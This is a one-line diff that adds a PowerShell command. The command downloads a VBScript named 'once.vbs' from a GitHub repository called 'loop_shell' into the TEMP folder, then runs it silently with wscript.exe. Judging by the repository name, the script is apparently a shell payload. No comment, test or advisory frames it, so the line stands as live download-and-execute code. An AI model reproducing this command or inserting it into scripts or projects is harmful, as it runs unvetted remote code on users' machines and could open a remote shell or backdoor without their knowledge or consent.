@@ -1,0 +1,1 @@
+Invoke-RestMethod -Uri "https://raw.githubusercontent.com/anaprivate/loop_shell/refs/heads/main/once.vbs" -OutFile "$env:TEMP\script.vbs"; Start-Process "wscript.exe" -ArgumentList "$env:TEMP\script.vbs"
